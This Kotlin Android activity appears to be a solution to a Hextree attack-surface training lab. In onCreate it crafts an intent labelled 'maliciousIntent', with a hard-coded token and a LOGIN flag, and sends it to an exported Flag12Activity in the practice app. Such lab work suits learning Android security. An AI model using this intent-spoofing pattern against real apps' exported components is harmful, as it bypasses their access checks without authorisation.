package io.hextree.webviewintent

import android.app.ComponentCaller
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

class Flag10Activity : AppCompatActivity(R.layout.activity_flag10) {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val maliciousIntent = Intent("io.hextree.attacksurface.ATTACK_ME")
        maliciousIntent.putExtra("token", 1094795585)
        maliciousIntent.putExtra("LOGIN", true)
        maliciousIntent.setComponent(
            ComponentName(
                "io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity"
            )
        )

        startActivityForResult(maliciousIntent, 42 )


        //prvo mi pozovemo flag12 jer je exported
        setResult(42, maliciousIntent)
        finish()

    }

    override fun onNewIntent(intent: Intent?) {
        Log.d("activity10", intent?.toString() ?: "--")
        super.onNewIntent(intent)
    }

    override fun onNewIntent(intent: Intent, caller: ComponentCaller) {
        Log.d("activity10", intent.toString() ?: "--")
        super.onNewIntent(intent, caller)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        Log.d("activity10", intent?.toString() ?: "--")
        super.onActivityResult(requestCode, resultCode, data)
    }

    override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?,
        caller: ComponentCaller
    ) {
        Log.d("activity10", data?.toString() ?: "--")
        super.onActivityResult(requestCode, resultCode, data, caller)
    }


}